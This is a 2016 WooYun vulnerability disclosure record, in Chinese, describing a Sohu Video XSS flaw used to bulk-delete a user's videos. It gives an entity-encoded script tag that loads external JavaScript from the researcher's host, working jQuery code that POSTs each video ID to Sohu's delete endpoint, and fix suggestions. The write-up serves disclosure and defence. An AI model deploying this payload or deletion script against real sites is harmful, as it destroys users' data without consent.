{"id": 75075, "wybug_id": "wooyun-2016-0168610", "wybug_title": "利用搜狐视频XSS批量删除用户视频", "wybug_corp": "搜狐", "wybug_author": "q601333824", "wybug_date": "2016-01-11 12:40", "wybug_open_date": "2016-02-22 16:48", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "9", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "持久型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向公众公开  简要描述： 利用搜狐视频XSS批量删除用户视频 详细说明：         1.上次搜狐的邮箱的域已经修改成mail.sohu.com      2.但是搜狐视频的域还是sohu.com,如图 \n\n     3.其他内容看这个漏洞，然后我从例子开始说\n WooYun: 利用搜狐邮箱XSS劫持用户邮件 \n     4.可以从搜狐社区，获取搜狐视频的内容，如图 \n\n---------------------------------------------------------------------------------------     5.上次说的搜狐社区XSS还没有修复,还是能用，能加载外部JS(不要在意状态404，为了演示插入一个没有的页面演示,这样就没危害了)     6.签名档插入代码 \n<br>&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#115;&#114;&#99;&#61;&#34;http://q601333824.sinaapp.com/xss1.js&#34;\n \n\n------------------------------------------------------------------------------------------    7.具体利用方法就是，获取用户视频列表的视频id,然后post请求删除,这个页面可以显示出用户一页视频 \nhttp://my.tv.sohu.com/user/video/list.do\n \n\n \n\n    8.这一段是我自己写的的JS代码，这个代码只删除一页视频,先获取当前页面所有视频id,然后把视频ID交给post函数循环删除.\nvar obj=$(\".item.cfix\");var changdu=obj.length;    if(changdu!=0){\t function post(id){\t\t alert(id);\t\t $.post(\"http://my.tv.sohu.com/user/a/wvideo/deletevideos.do\",\t\t {\"vids\":id\t\t },\t\t function(data,stat){\t\t\t  if(stat==\"success\"){\t\t\t\t  alert(\"删除成功\");\t\t\t    }else{\t\t\t\t\t  alert(\"删除失败\");\t\t\t\t}\t\t\t}\t\t\t \t    );    }\tfor(var i=0;i<changdu;i++){\t\tvar id=obj[i].getAttribute(\"data-vid\");\t\t\t\tpost(id);\t}}else{\talert(\"对不起，您没有上传视频\");}\n  9.至于批量删除，可以实现的，因为一页显示10个视频，计算出总页数，也就是删除次数 \n删除次数=Math.ceil(总视频数量 / 10)\n---------------------------------------------------------------------------------------------  10.下面直接测试图片(这次不要加载w3c菜鸟教程的库了，因为搜狐视频支持post)    ①.我把每次获取的视频编号弹出来一次，这是其中一个视频 \n\n   ②.删除成功 \n\n    ③.那么多的post请求，返回删除成功 \n\n    ④.视频列表全没了(这我自己的号，不是别的，别打我) \n\n     漏洞证明：   1.漏洞证明看上面 2下面直接测试图片(这次不要加载w3c菜鸟教程的库了，因为搜狐视频支持post)    ①.我把每次获取的视频编号弹出来一次，这是其中一个视频 \n\n   ②.删除成功 \n\n    ③.那么多的post请求，返回删除成功 \n\n    ④.视频列表全没了(这我自己的号，不是别的，别打我) \n\n   修复方案：      1.可以在网页代码加上这句话 \ndocument.domain=\"tv.sohu.com\"\n    2.也可以试试 \nx-frame-options\n    3.补充一下，我测试删的是我视频，没删别人的(=_=)   版权声明：转载请注明来源 q601333824@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-01-11 18:25 厂商回复： 感谢指出问题.我们正在与业务线协商解决方案. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-11 18:44 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:269 漏洞数:56        | 出自《狐妖小红娘》---自古人妖生死恋，千...)\t\t \n  @搜狐 别的站点就不提交了，其他站点的关键操作也看看有没有存在一样的问题....(=_=)    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}